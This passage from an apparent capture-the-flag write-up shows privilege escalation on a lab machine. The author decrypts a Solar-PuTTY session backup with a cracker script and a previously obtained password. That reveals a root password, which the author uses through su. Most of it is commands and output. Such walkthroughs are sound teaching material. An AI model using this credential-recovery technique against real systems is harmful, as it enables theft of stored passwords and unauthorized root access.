Eventually, I came across a ```backups``` folder in ```/opt```, which contains a Solar-PuTTY session backup.

```
shirohige@instant:~$ ls -al /opt/backups/Solar-PuTTY/
total 12
drwxr-xr-x 2 shirohige shirohige 4096 Oct  4 15:22 .
drwxr-xr-x 3 shirohige shirohige 4096 Oct  4 15:22 ..
-rw-r--r-- 1 shirohige shirohige 1100 Sep 30  2024 sessions-backup.dat
```

The backup file can be decrypted with the previously obtained password for ```shirohige``` (web user).

```
┌──(venv)─(kali㉿kali)-[/tmp]
└─$ python3 ~/opt/SolarPuttyCracker/SolarPuttyCracker.py -p estrella /tmp/sessions-backup.dat 
   ____       __             ___         __   __          _____                 __            
  / __/___   / /___ _ ____  / _ \ __ __ / /_ / /_ __ __  / ___/____ ___ _ ____ / /__ ___  ____
 _\ \ / _ \ / // _ `// __/ / ___// // // __// __// // / / /__ / __// _ `// __//  '_// -_)/ __/
/___/ \___//_/ \_,_//_/   /_/    \_,_/ \__/ \__/ \_, /  \___//_/   \_,_/ \__//_/\_\ \__//_/   
                                                /___/                                         
Trying to decrypt using password: estrella
Decryption successful using password: estrella
[+] DONE Decrypted file is saved in: SolarPutty_sessions_decrypted.txt
                                                                                                                                                   
┌──(venv)─(kali㉿kali)-[/tmp]
└─$ cat SolarPutty_sessions_decrypted.txt 
{
    "Sessions": [
        {
            "Id": "066894ee-635c-4578-86d0-d36d4838115b",
            "Ip": "10.10.11.37",
            "Port": 22,
            "ConnectionType": 1,
            "SessionName": "Instant",
            "Authentication": 0,
            "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
            "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
            "LastTimeOpen": "0001-01-01T00:00:00",
            "OpenCounter": 1,
            "SerialLine": null,
            "Speed": 0,
            "Color": "#FF176998",
            "TelnetConnectionWaitSeconds": 1,
            "LoggingEnabled": false,
            "RemoteDirectory": ""
        }
    ],
    "Credentials": [
        {
            "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
            "CredentialsName": "instant-root",
            "Username": "root",
            "Password": "12**24nzC!r0c%q12",
            "PrivateKeyPath": "",
            "Passphrase": "",
            "PrivateKeyContent": null
        }
    ],
    "AuthScript": [],
    "Groups": [],
    "Tunnels": [],
    "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}
```

The decrypted text contains a password for root. This password is valid and grants us root privileges on instant.

```
shirohige@instant:~$ su root
Password: 
root@instant:/home/shirohige#
```